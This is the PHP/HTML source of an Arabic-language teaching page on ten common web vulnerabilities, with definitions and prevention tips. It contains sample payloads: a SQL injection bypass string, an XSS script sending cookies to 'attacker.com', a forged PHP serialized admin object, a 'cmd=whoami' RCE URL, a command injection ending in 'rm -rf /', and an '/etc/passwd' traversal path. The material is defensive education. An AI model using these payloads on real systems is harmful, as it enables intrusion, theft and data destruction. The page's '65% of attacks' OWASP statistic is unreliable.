<?php
include('../conn.php');

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

include '../session_check.php';
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="دليل شامل لأهم 10 ثغرات أمنية في تطبيقات الويب وكيفية الوقاية منها">
    <meta name="keywords" content="ثغرات أمنية, أمن تطبيقات الويب, SQL Injection, XSS, CSRF, أمن المعلومات">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>أهم 10 ثغرات أمنية في تطبيقات الويب - دليل شامل</title>
    <style>
        :root {
            --primary-color: #084584;
            --secondary-color: #2980b9;
            --accent-color: #f39c12;
            --dark-color: #2c3e50;
            --light-color: #ecf0f1;
            --danger-color: #e74c3c;
            --success-color: #27ae60;
            --text-color: #333;
            --text-light: #555;
        }
        
        body {
            font-family: 'Tajawal', 'Cairo', sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            color: var(--text-color);
            direction: rtl;
            text-align: right;
            background-image: url('../img/background6.jpg');
            background-size: cover;
            background-position: center center;
            background-attachment: fixed;
            line-height: 1.8;
        }

        .title {
            font-size: 2.8rem;
            color: var(--primary-color);
            text-align: center;
            padding: 20px;
            margin: 12px auto 20px;
            position: relative;
            width: fit-content;
        }

        .title::after {
            content: "";
            position: absolute;
            bottom: 10px;
            right: 0;
            width: 70%;
            height: 3px;
            background: linear-gradient(to right, var(--secondary-color), transparent);
            border-radius: 3px;
        }

        .container {
            padding: 40px;
            max-width: 1200px;
            margin: 20px auto 50px;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .container:hover {
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            transform: translateY(-5px);
        }

        .section-title {
            font-size: 2rem;
            color: var(--secondary-color);
            margin-bottom: 30px;
            font-weight: 800;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--secondary-color);
            position: relative;
        }

        .section-title::before {
            content: "";
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 100px;
            height: 4px;
            background: var(--accent-color);
            border-radius: 2px;
        }

        .vulnerability-card {
            padding: 30px;
            margin: 30px 0;
            border-radius: 12px;
            background-color: rgba(250, 250, 250, 0.9);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
            border-left: 5px solid var(--secondary-color);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .vulnerability-card:hover {
            background-color: rgba(241, 241, 241, 0.95);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
            transform: translateX(-10px);
        }

        .vulnerability-card::before {
            content: "";
            position: absolute;
            top: 0;
            right: 0;
            width: 5px;
            height: 0;
            background: var(--accent-color);
            transition: all 0.4s ease;
        }

        .vulnerability-card:hover::before {
            height: 100%;
        }

        .card-header {
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--dark-color);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }

        .card-header i {
            margin-left: 10px;
            color: var(--secondary-color);
        }

        .paragraph, .custom-ul {
            font-size: 1.1rem;
            color: var(--text-light);
            line-height: 1.9;
        }

        pre {
            background-color: var(--dark-color);
            color: #fff;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 1rem;
            overflow-x: auto;
            white-space: pre-wrap;
            position: relative;
        }

        pre::before {
            content: "كود";
            position: absolute;
            top: 0;
            left: 0;
            background: var(--accent-color);
            color: white;
            padding: 2px 10px;
            font-size: 0.8rem;
            border-radius: 0 0 5px 0;
        }

        .example-box {
            background-color: var(--light-color);
            padding: 20px;
            margin-top: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
            border-right: 3px solid var(--accent-color);
        }

        .note {
            background-color: #fff3cd;
            padding: 20px;
            border-left: 5px solid var(--accent-color);
            margin: 25px 0;
            font-size: 1.1rem;
            border-radius: 8px;
            position: relative;
        }

        .note::before {
            content: "ملاحظة هامة";
            font-weight: bold;
            display: block;
            margin-bottom: 10px;
            color: var(--dark-color);
        }

        .warning {
            background-color: #f8d7da;
            border-left: 5px solid var(--danger-color);
        }

        .warning::before {
            content: "تحذير";
            color: var(--danger-color);
        }

        .img-tool {
            width: 70%;
            max-width: 800px;
            border-radius: 12px;
            margin: 30px auto;
            display: block;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
            border: 3px solid white;
        }

        .img-tool:hover {
            transform: scale(1.02);
        }

        .advantages .custom-ul {
            list-style-type: none;
            padding-right: 0;
        }

        .advantages .custom-li {
            font-size: 1.1rem;
            color: var(--text-light);
            padding: 10px 0;
            position: relative;
            padding-right: 30px;
        }

        .advantages .custom-li::before {
            content: "\f00c";
            font-family: "Font Awesome 6 Free";
            font-weight: 900;
            position: absolute;
            right: 0;
            color: var(--success-color);
        }

        .severity {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin-right: 10px;
            font-size: 0.9rem;
        }

        .severity-high {
            background-color: #ff6b6b;
            color: white;
        }

        .severity-medium {
            background-color: #feca57;
            color: #333;
        }

        .severity-low {
            background-color: #1dd1a1;
            color: white;
        }

        .protection-methods {
            background-color: #e8f4fc;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
            border-left: 5px solid var(--secondary-color);
        }

        .protection-methods h4 {
            color: var(--secondary-color);
            margin-bottom: 15px;
        }

        @media screen and (max-width: 768px) {
            .title {
                font-size: 2rem;
            }
            
            .container {
                padding: 20px;
                margin: 10px auto 30px;
            }
            
            .section-title {
                font-size: 1.5rem;
            }
            
            .vulnerability-card {
                padding: 20px;
            }
            
            .img-tool {
                width: 100%;
            }
        }

        /* Animation */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .vulnerability-card {
            animation: fadeIn 0.6s ease forwards;
        }

        .vulnerability-card:nth-child(1) { animation-delay: 0.1s; }
        .vulnerability-card:nth-child(2) { animation-delay: 0.2s; }
        .vulnerability-card:nth-child(3) { animation-delay: 0.3s; }
        .vulnerability-card:nth-child(4) { animation-delay: 0.4s; }
        .vulnerability-card:nth-child(5) { animation-delay: 0.5s; }
    </style>
</head>
<body>
<?php
include('header-learn-home.php');
?>

<h1 class="title"><i class="fas fa-shield-virus"></i> أهم 10 ثغرات أمنية في تطبيقات الويب</h1>

<div class="container">
    <!-- SQL Injection -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 1. ثغرة حقن SQL (SQL Injection)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-database"></i> التعريف</div>
            <p class="paragraph">SQL Injection هي واحدة من أكثر الثغرات شهرة في تطبيقات الويب. تحدث عندما يتيح التطبيق للمهاجم إدخال أوامر SQL ضارة عبر مدخلات المستخدم، مما يسمح له بالتحكم في قاعدة البيانات.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> طريقة الاستغلال:</h4>
                <p>يقوم المهاجم بحقن أوامر SQL ضارة في الحقول المدخلة من قبل المستخدم، مثل "اسم المستخدم" أو "كلمة المرور"، مما يؤدي إلى تنفيذ أوامر غير مصرح بها على قاعدة البيانات.</p>
                <pre>// مثال على استعلام ضعيف
SELECT * FROM users WHERE username = '$username' AND password = '$password'

// حقن SQL
username: ' OR '1'='1' --
password: أي شيء
// يصبح الاستعلام
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'أي شيء'</pre>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">استخدم استعلامات محضرة (Prepared Statements) مع المعلمات</li>
                    <li class="custom-li">تطبيق مبدأ الامتيازات الأقل (Least Privilege) على حسابات قواعد البيانات</li>
                    <li class="custom-li">استخدم ORM (Object-Relational Mapping) بدلاً من SQL الخام</li>
                    <li class="custom-li">تطهير المدخلات وتحديد الأنماط المتوقعة (Input Validation)</li>
                </ul>
            </div>
            
            <div class="note">
                <strong>إحصائية:</strong> وفقًا لـ OWASP، SQL Injection مسؤولة عن حوالي 65% من هجمات تطبيقات الويب.
            </div>
        </div>
    </section>

    <!-- XSS -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 2. ثغرة البرمجة عبر المواقع (XSS)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-code"></i> التعريف</div>
            <p class="paragraph">تسمح ثغرة XSS للمهاجم بحقن أكواد JavaScript ضارة في صفحات الويب التي يقوم المستخدمون بزيارتها، مما يسمح له بالتحكم في سلوك الصفحة أو سرقة معلومات المستخدمين.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> أنواع XSS:</h4>
                <ul>
                    <li><strong>Stored XSS:</strong> يتم تخزين الكود الضار في قاعدة البيانات ويظهر لكل المستخدمين</li>
                    <li><strong>Reflected XSS:</strong> الكود الضار ينعكس في الاستجابة الفورية دون تخزينه</li>
                    <li><strong>DOM-based XSS:</strong> يتم تنفيذ الثغرة في متصفح الضحية دون إرسال الكود إلى الخادم</li>
                </ul>
                <pre>// مثال على هجوم XSS
&lt;script&gt;
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
&lt;/script&gt;</pre>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">ترميز (Encoding) جميع البيانات المعروضة للمستخدم (HTML, JS, CSS, URL Encoding)</li>
                    <li class="custom-li">استخدام Content Security Policy (CSP) لتقييد مصادر الأكواد المسموح بها</li>
                    <li class="custom-li">تعيين رأس HttpOnly للكوكيز لمنع الوصول إليها عبر JavaScript</li>
                    <li class="custom-li">تطهير المدخلات باستخدام مكتبات مثل DOMPurify</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- CSRF -->
    <section>
        <h2 class="section-title"><span class="severity severity-medium">خطورة متوسطة</span> 3. ثغرة تزوير الطلب عبر المواقع (CSRF)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-exchange-alt"></i> التعريف</div>
            <p class="paragraph">تحدث هذه الثغرة عندما يقوم المهاجم بإجبار المستخدم الموثوق به على تنفيذ طلب غير مصرح به باستخدام صلاحياته، مما يؤدي إلى تنفيذ عمليات غير مرغوب فيها على الخادم.</p>
            
            <img src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/cross-site-request-forgery-csrf.png" alt="عملية هجوم CSRF" class="img-tool">
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">استخدام رموز CSRF (CSRF Tokens) في النماذج وطلبات POST</li>
                    <li class="custom-li">التحقق من رأس `Origin` أو `Referer` للطلبات الحساسة</li>
                    <li class="custom-li">استخدام رأس `SameSite` للكوكيز لتقييد كيفية إرسالها</li>
                    <li class="custom-li">طلب إعادة المصادقة (Re-authentication) للعمليات الحساسة</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Insecure Deserialization -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 4. ثغرة Insecure Deserialization</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-archive"></i> التعريف</div>
            <p class="paragraph">تحدث هذه الثغرة عندما يتم التعامل مع البيانات غير الموثوقة وتحويلها إلى كائنات يمكن تعديلها وتنفيذ أكواد غير مرخصة.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> مثال على هجوم:</h4>
                <pre>// بيانات متسلسلة ضارة في PHP
O:4:"User":2:{s:8:"username";s:6:"hacker";s:10:"isAdmin";b:1;}</pre>
                <p>يمكن أن يؤدي تحويل هذه البيانات إلى كائن إلى منح صلاحيات إدارية غير مصرح بها.</p>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">عدم قبول البيانات المتسلسلة من مصادر غير موثوقة</li>
                    <li class="custom-li">استخدام تنسيقات آمنة مثل JSON بدلاً من الكائنات المتسلسلة</li>
                    <li class="custom-li">تنفيذ التحقق من صحة الكائنات بعد التحويل</li>
                    <li class="custom-li">استخدام التوقيعات الرقمية للتحقق من سلامة البيانات</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- RCE -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 5. ثغرة تنفيذ الكود عن بُعد (RCE)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-terminal"></i> التعريف</div>
            <p class="paragraph">ثغرة RCE تسمح للمهاجم بتنفيذ أكواد على الخادم البعيد مما يمنحه القدرة على التحكم الكامل في النظام.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> طرق الاستغلال:</h4>
                <ul>
                    <li>استغلال الثغرات في المكونات المستخدمة (مثل المكتبات أو الأطر البرمجية)</li>
                    <li>رفع ملفات ضارة وتنفيذها</li>
                    <li>استغلال أوامر النظام غير المحمية</li>
                </ul>
                <pre>// مثال على استغلال RCE في PHP
http://example.com/page.php?cmd=whoami</pre>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">تعطيل الوظائف الخطيرة مثل `eval()`, `exec()`, `system()`</li>
                    <li class="custom-li">فحص جميع الملفات المرفوعة والتأكد من أنها لا تحتوي على أكواد ضارة</li>
                    <li class="custom-li">تحديث المكونات والبرامج المستخدمة بانتظام</li>
                    <li class="custom-li">تنفيذ التطبيق في بيئة محدودة الصلاحيات (Sandbox)</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Command Injection -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 6. ثغرة حقن الأوامر (Command Injection)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-terminal"></i> التعريف</div>
            <p class="paragraph">تحدث ثغرة Command Injection عندما يقوم المهاجم بإدخال أوامر نظام تشغيل عبر مدخلات المستخدم، مما يتيح له تنفيذ أوامر على الخادم.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> مثال على هجوم:</h4>
                <pre>// تطبيق ينفذ أمر ping
system("ping -c 4 " . $_GET['ip']);

// حقن أمر
http://example.com/ping.php?ip=127.0.0.1; rm -rf /</pre>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">عدم استخدام مدخلات المستخدم في أوامر النظام مباشرة</li>
                    <li class="custom-li">استخدام واجهات API آمنة بدلاً من تنفيذ الأوامر مباشرة</li>
                    <li class="custom-li">التحقق من صحة المدخلات باستخدام القوائم البيضاء (Whitelisting)</li>
                    <li class="custom-li">تنفيذ التطبيق بحساب مستخدم محدود الصلاحيات</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Buffer Overflow -->
    <section>
        <h2 class="section-title"><span class="severity severity-high">خطورة عالية</span> 7. ثغرة تجاوز الذاكرة (Buffer Overflow)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-memory"></i> التعريف</div>
            <p class="paragraph">تحدث هذه الثغرة عندما يكتب البرنامج بيانات أكثر من المساحة المخصصة لها في الذاكرة، مما يؤدي إلى تعديل البيانات الأخرى في الذاكرة أو تنفيذ تعليمات ضارة.</p>
            
            <img src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/buffer-overflow-attack.png" alt="عملية تجاوز الذاكرة" class="img-tool">
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">استخدام لغات آمنة للذاكرة مثل Java أو Python بدلاً من C/C++</li>
                    <li class="custom-li">تنفيذ التحقق من حدود الذاكرة (Bounds Checking)</li>
                    <li class="custom-li">تمكين حماية الذاكرة مثل DEP وASLR</li>
                    <li class="custom-li">استخدام أدوات التحليل الثابت لاكتشاف الثغرات</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Path Traversal -->
    <section>
        <h2 class="section-title"><span class="severity severity-medium">خطورة متوسطة</span> 8. ثغرة تجاوز المسار (Path Traversal)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-folder-open"></i> التعريف</div>
            <p class="paragraph">تسمح هذه الثغرة للمهاجم بالوصول إلى ملفات غير مصرح بها عبر تعديل مسار الملفات، مما يتيح له قراءة أو تعديل الملفات الحساسة.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> مثال على هجوم:</h4>
                <pre>http://example.com/download.php?file=../../../../etc/passwd</pre>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">تحديد المسار الأساسي (Base Directory) ورفض أي محاولة للخروج منه</li>
                    <li class="custom-li">استخدام قوائم بيضاء (Whitelists) للأسماء المسموح بها</li>
                    <li class="custom-li">تطبيع المسارات (Path Normalization) قبل معالجتها</li>
                    <li class="custom-li">تنفيذ التطبيق بحساب مستخدم محدود الصلاحيات</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Race Condition -->
    <section>
        <h2 class="section-title"><span class="severity severity-medium">خطورة متوسطة</span> 9. ثغرة سباق العمليات (Race Condition)</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-stopwatch"></i> التعريف</div>
            <p class="paragraph">تحدث هذه الثغرة عندما يحدث تداخل بين عمليات متعددة في نفس الوقت بشكل غير متوقع، مما يؤدي إلى تغيير غير مرغوب فيه للبيانات أو خلل في النظام.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-bug"></i> مثال على هجوم TOCTOU (Time-of-Check to Time-of-Use):</h4>
                <ol>
                    <li>يتحقق التطبيق من صلاحيات المستخدم</li>
                    <li>يقوم المهاجم بتغيير الملف قبل استخدامه</li>
                    <li>يستخدم التطبيق الملف المعدل دون إعادة التحقق</li>
                </ol>
            </div>
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">استخدام أقفال (Locks) للوصول إلى الموارد المشتركة</li>
                    <li class="custom-li">تنفيذ التحقق من الصلاحيات قبل كل عملية حساسة</li>
                    <li class="custom-li">استخدام المعاملات (Transactions) في قواعد البيانات</li>
                    <li class="custom-li">تصميم التطبيق لتجنب حالات السباق</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Clickjacking -->
    <section>
        <h2 class="section-title"><span class="severity severity-low">خطورة منخفضة</span> 10. ثغرة Clickjacking</h2>
        <div class="vulnerability-card">
            <div class="card-header"><i class="fas fa-mouse-pointer"></i> التعريف</div>
            <p class="paragraph">تحدث هذه الثغرة عندما يقوم المهاجم بتغطية واجهة المستخدم لعناصر من موقع آخر في صفحة ويب، مما يجعل المستخدم ينقر على عناصر مخفية دون علمه.</p>
            
            <img src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/clickjacking-attack.jpg" alt="عملية هجوم Clickjacking" class="img-tool">
            
            <div class="protection-methods">
                <h4><i class="fas fa-shield-alt"></i> كيفية الوقاية:</h4>
                <ul class="custom-ul advantages">
                    <li class="custom-li">استخدام رأس `X-Frame-Options: DENY` لمنع التضمين في iframe</li>
                    <li class="custom-li">تنفيذ Content Security Policy (CSP) مع توجيه `frame-ancestors`</li>
                    <li class="custom-li">استخدام JavaScript للكشف عن التضمين في iframe (Frame Busting)</li>
                    <li class="custom-li">طلب تأكيد المستخدم للعمليات الحساسة</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- خاتمة -->
    <section>
        <div class="vulnerability-card" style="background-color: #f8f9fa; border-left: 5px solid var(--primary-color);">
            <div class="card-header"><i class="fas fa-graduation-cap"></i> أفضل الممارسات الأمنية</div>
            <p class="paragraph">لحماية تطبيقات الويب من الثغرات الأمنية، اتبع هذه الممارسات الأساسية:</p>
            
            <ul class="custom-ul advantages">
                <li class="custom-li">تحديث جميع المكونات والبرامج المستخدمة بانتظام</li>
                <li class="custom-li">تنفيذ مبدأ الامتيازات الأقل (Least Privilege)</li>
                <li class="custom-li">تطبيق التحقق من صحة المدخلات (Input Validation)</li>
                <li class="custom-li">ترميز (Encoding) جميع المخرجات المعروضة للمستخدم</li>
                <li class="custom-li">تنفيذ المصادقة القوية وإدارة الجلسات بشكل آمن</li>
                <li class="custom-li">استخدام التشفير للبيانات الحساسة في النقل والتخزين</li>
                <li class="custom-li">تنفيذ السجلات الأمنية (Logging) والمراقبة</li>
                <li class="custom-li">إجراء اختبارات الأمان بانتظام (Penetration Testing)</li>
            </ul>
            
            <div class="note">
                <strong>مصادر تعلم إضافية:</strong> OWASP Top 10، SANS Top 25، NIST Cybersecurity Framework
            </div>
        </div>
    </section>
</div>

<script>
    // Simple animation on scroll
    document.addEventListener('DOMContentLoaded', function() {
        const cards = document.querySelectorAll('.vulnerability-card');
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = 1;
                    entry.target.style.transform = 'translateY(0)';
                }
            });
        }, {threshold: 0.1});
        
        cards.forEach(card => {
            card.style.opacity = 0;
            card.style.transform = 'translateY(20px)';
            card.style.transition = 'all 0.6s ease';
            observer.observe(card);
        });
    });
</script>
</body>
</html>
